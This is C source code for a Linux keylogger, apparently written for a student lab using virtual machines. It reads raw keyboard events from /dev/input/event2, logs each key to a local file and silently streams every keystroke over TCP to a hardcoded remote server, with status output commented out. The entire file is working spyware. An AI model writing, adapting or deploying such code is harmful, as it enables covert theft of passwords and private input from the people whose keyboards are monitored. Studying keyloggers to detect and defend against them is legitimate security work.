#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <strings.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/input.h>
#include <netdb.h>
// Used https://nayandas3234.medium.com/how-to-make-a-linux-based-keylogger-a6088e009aab for guidance

#define PORT 8080
// Server address will depend on your VM
// #define ADDRESS "10.0.2.15" // Uwem's server VM
#define ADDRESS "192.168.56.102" //Alvin's Server VM
#define SA struct sockaddr

char *keys = "__1234567890-=__qwertyuiop[]__asdfghjkl;'___zxcvbnm,./";
char other_key[10];

void keylogger(int log_file, int sockfd) {
    // Set a fd variable for the keyboard file to read from
    // Looks like the keyboard buffer is not constant across machines
    int fd = open("/dev/input/event2", O_RDONLY);

    // While some condition is met - only using this condition temporarily
    int i = 0;
    struct input_event event;

    while (i < 20) {
        // Read from the keyboard
        int bytes_read = read(fd, &event, sizeof(event));
        if (bytes_read == -1) {
            // For debugging purposes
            printf("Could not read\n");
            return;
        }
        // Check to see if EV_KEY event and that a button was pressed
        if (event.type == EV_KEY && event.value == 0) {
            // Need to handle all special cases
            switch(event.code) {
                case 1:
                  write(log_file, "[ESC]", strlen("[ESC]"));
        write(sockfd, "[ESC]", strlen("[ESC]"));
        break;
                case 14:
                    write(log_file, "[DELETE]", strlen("[DELETE]"));
		    write(sockfd, "[DELETE]", strlen("[DELETE]"));
		    break;
                case 15:
                    write(log_file, "\t", sizeof(char));
		    write(sockfd, "\t", sizeof(char));
		    break;
                case 28:
                    write(log_file, "[ENTER]", strlen("[ENTER]"));
		    write(sockfd, "[ENTER]", strlen("[ENTER]"));
		    break;
                case 29:
                write(log_file, "[CTRL]", strlen("[CTRL]"));
        write(sockfd, "[CTRL]", strlen("[CTRL]"));
        break;
                case 43:
                    write(log_file, "\\", sizeof(char));
		    write(sockfd, "\\", sizeof(char));
		    break;
                case 57:
                    write(log_file, " ", sizeof(char));
		    write(sockfd, " ", sizeof(char));
		    break;
                case 42:
                    write(log_file, "[SHIFT]", strlen("[SHIFT]"));
        write(sockfd, "[SHIFT]", strlen("[SHIFT]"));
        break;
                case 103:
                    write(log_file, "[UP]", strlen("[UP]"));
        write(sockfd, "[UP]", strlen("[UP]"));
        break;
                case 105:
                    write(log_file, "[LEFT]", strlen("[LEFT]"));
        write(sockfd, "[LEFT]", strlen("[LEFT]"));
        break;
                case 106:
                    write(log_file, "[RIGHT]", strlen("[RIGHT]"));
        write(sockfd, "[RIGHT]", strlen("[RIGHT]"));
        break;
                case 108:
                    write(log_file, "[DOWN]", strlen("[DOWN]"));
        write(sockfd, "[DOWN]", strlen("[DOWN]"));
        break;
                default:
                  if(event.code <= 53){
                    write(log_file, &keys[event.code], sizeof(char));
		                write(sockfd, &keys[event.code], sizeof(char));
                  }
                  else{
                    int num = sprintf(other_key,"[%i]",event.code);
                    if(num){
                      write(log_file, other_key, num);
                      write(sockfd, other_key, num);
                    }
                  }
		    break;
            }
            i++;
        }
    }
}

int main(int argc, char* argv[]) {
    int fd = open("log.txt", O_CREAT | O_TRUNC | O_RDWR);

    //TCP Client based on https://www.geeksforgeeks.org/tcp-server-client-implementation-in-c/
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    // socket create and varification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        // printf("socket creation failed...\n");
        exit(0);
    }
    else
        // printf("Socket successfully created..\n");
    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(ADDRESS);
    servaddr.sin_port = htons(PORT);

    // connect the client socket to server socket
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        // printf("connection with the server failed...\n");
        exit(0);
    }
    else
        // printf("connected to the server..\n");

    while(1)
    keylogger(fd,sockfd);

    close(sockfd);
    return 1;
}
